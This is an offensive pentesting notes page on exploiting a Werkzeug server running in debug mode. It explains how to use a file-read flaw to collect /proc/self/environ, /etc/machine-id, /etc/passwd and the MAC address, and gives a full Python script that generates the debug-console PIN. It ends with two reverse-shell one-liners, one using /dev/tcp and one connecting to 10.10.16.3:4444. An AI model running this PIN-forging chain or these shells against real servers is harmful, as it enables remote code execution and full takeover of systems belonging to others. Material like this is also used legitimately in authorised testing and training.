# Werkzeug



### Exploit debugging mode

If a Werkzeug server is being run in debug mode, a pin protected console is accessible if we provoke an error on a page

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F3BQ9mZKWTRRI54Azrkcd%2Fimage.png?alt=media&#x26;token=1e8c0b42-2f1e-4c8b-bd39-a845a2c3202d" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
To craft the console pin, we need a way to read file contents (ex LFI)
{% endhint %}

#### Requirements

* The MAC address of the computer in decimal format
* The machine ID
* The username of who started the flask app ⇒ can be found in the error logs or /proc/self/environ
* The absolute path to app.py
* The module name of the Flask application
* The application name

#### Fetching the informations

**MAC address in decimal format**

First, we need to find the device on which the server is running. We can see it in `/proc/net/arp`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FYQ1a4FC7nYnfoJpjWuRl%2Fhttps___files.gitbook.com_v0_b_gitbook-x-prod.appspot.com_o_spaces_2FBVYdRQWhXrZbqzYeOYpH_2Fuploads_2FoIFq2pNLdoLaIFUMcP53_2Fimage.avif?alt=media&#x26;token=a2bf6e45-8a40-4d9b-af27-54631aaf8164" alt=""><figcaption></figcaption></figure>

Once we know the id, we can get the MAC address in `/sys/class/net/<DEVICE_ID>/address`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F5F106V4anxx8OZ5Kehqi%2Fhttps___files.gitbook.com_v0_b_gitbook-x-prod.appspot.com_o_spaces_2FBVYdRQWhXrZbqzYeOYpH_2Fuploads_2Fa1yZH23Vl0Y7C8l7FgiP_2Fimage.avif?alt=media&#x26;token=c6e9b22a-bec5-4f96-a802-2851b2bfbbb4" alt=""><figcaption></figcaption></figure>

Finally, convert the address to a decimal format by deleting the `:` and putting `0x` in front

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3                  
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(0x005056b0470c)
345051776780
```

**Machine ID**

The machine ID is composed of 2 parts. The 1st one can be found in `/etc/machine-id`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FBUYAUh2Te4nvT4HlVpkt%2Fhttps___files.gitbook.com_v0_b_gitbook-x-prod.appspot.com_o_spaces_2FBVYdRQWhXrZbqzYeOYpH_2Fuploads_2FXoKBH5kiSWhwDKP7TCNt_2Fimage.avif?alt=media&#x26;token=319a5eee-0cff-418f-8e2a-b83ea32afb1b" alt=""><figcaption></figcaption></figure>

The second one is in `/proc/self/cgroup`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fzjmjgp17zCQHUv6YqTyb%2Fhttps___files.gitbook.com_v0_b_gitbook-x-prod.appspot.com_o_spaces_2FBVYdRQWhXrZbqzYeOYpH_2Fuploads_2Fs6pXCydXEuI03yl1MNek_2Fimage.png?alt=media&#x26;token=c3b5d624-cfa8-4b29-a19d-5ee3ddf8e052" alt=""><figcaption></figcaption></figure>

To craft the final ID, we need to append the last part of the cgroup (after the last /) after the content of `/etc/machine-id`

```shellscript
ed5b159560f54721827644bc9b220d00superpass.service
```

**Username of the user who started the server**

We can find our user in `/proc/self/environ`. If in the end, the pin crafted doesn't work, try to look at other users that may have started the server in `/etc/passwd`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FoZZ1FceCMkTsUUrg99aG%2Fhttps___files.gitbook.com_v0_b_gitbook-x-prod.appspot.com_o_spaces_2FBVYdRQWhXrZbqzYeOYpH_2Fuploads_2FS3QkMO5eDuq6mq5AODEx_2Fimage.avif?alt=media&#x26;token=020ef932-93c0-49cc-85ae-222d20cf0742" alt=""><figcaption></figcaption></figure>

**Absolute path to app.py**

We can find it in the debug logs by getting a server error

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FbNfCI2QnMtQGWvj5QY9C%2Fhttps___files.gitbook.com_v0_b_gitbook-x-prod.appspot.com_o_spaces_2FBVYdRQWhXrZbqzYeOYpH_2Fuploads_2FbpmKhrBbGTxEdoCVAzwY_2Fimage.avif?alt=media&#x26;token=382299bb-6eae-4a7e-adb0-77597a2c4eae" alt=""><figcaption></figcaption></figure>

**Module and application name**

To find the module name, we can use the previously found path to `app.py` found in the debug logs. We see it is located in the directory `/flask/app.py`. In python, directories use a `.` therefore it would be `flask.app`. The application name can be any of the below, so it would be wise to try the different combinations.

```shellscript
Module Name      Application Name
-------------------------------------
flask.app      - wsgi_app
werkzeug.debug - DebuggedApplication
flask.app      - Flask
```

#### Generating the pin

The following script will generate the pin. We can then use it to access the console and run commands

```python
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
        '<USERNAME>',
        '<MODNAME>',
        '<APP_NAME>',
        '<ABSOLUTE_PATH_TP_APP>'
]

private_bits = [
        '<DECIMAL_MAC_ADDRESS>',
        '<MACHINE_ID>'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print("Pin: " + rv)
```

#### Grab a reverse shell

```python
import os; os.system("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

**Resources**

{% embed url="https://www.youtube.com/watch?embeds_referring_euri=https://cdn.iframe.ly/&v=6BWaea0nfE0" %}

{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html?highlight=werkz#werkzeug-console-pin-exploit" %}
